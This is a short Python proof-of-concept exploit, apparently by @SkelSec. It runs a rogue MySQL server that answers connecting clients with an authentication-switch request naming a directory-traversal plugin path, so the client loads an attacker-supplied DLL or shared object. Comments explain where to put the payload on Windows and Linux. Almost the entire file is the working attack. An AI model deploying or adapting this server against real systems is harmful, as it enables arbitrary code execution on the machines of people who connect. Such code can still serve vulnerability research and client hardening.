import asyncio

from mysql_protocol import *

# Notes:
#   On windows you need to put the payload in the DLLMain
#   On linux there is no dllmain, you need to implement the correct exports, ALSO!!! the plugin name must be containing the directory traversal string!!!!
#   Also on linux, the apt install mysql-client doesnt create a plugins directory therefore the directory traversal will not work :(
#
#   Both platforms: the dll_name variable must not contain the extension. it will be automatically filled out on the appropriate platform (.dll on win, .so on linux)
#
# Author: @SkelSec
#
#

#dll_name = '../../../../../../../home/victim/Desktop/mysql_so_test/evilplugin'
dll_name = '../../../../../../../Users\\victim\\Desktop\\popup64'
server_version = '5.0.54'
server_challenge = 'A'*20 #needs to be string of 20 characters!

async def read_reply(reader, expected_packet):
	t_length = await reader.readexactly(3)
	length = int.from_bytes(t_length,byteorder = 'little', signed = False) + 1
	data = await reader.readexactly(length)
	
	return expected_packet.from_bytes(t_length + data)


async def mysql_server(reader, writer):
	print('MYSQL Client connected from %s:%s' % writer.get_extra_info('peername'))
	sequence_id = 0
	handshake = HandshakeV10_New(server_version, server_challenge[:8], server_challenge[8:])
	writer.write(handshake.to_bytes())
	await writer.drain()
	sequence_id += 1
	
	reply = await read_reply(reader, HandshakeResponse41)
	sequence_id += 1

	switch = AuthSwitchRequest(sequence_id, dll_name)
	writer.write(switch.to_bytes())
	await writer.drain()

	reply = await read_reply(reader, AuthSwitchResponse)
	sequence_id += 1
	
	writer.close()
	print('Exploit should been triggered by now...')
	
async def main(host, port):
	server = await asyncio.start_server(mysql_server, host, port)
	await server.serve_forever()

asyncio.run(main('0.0.0.0', 3306))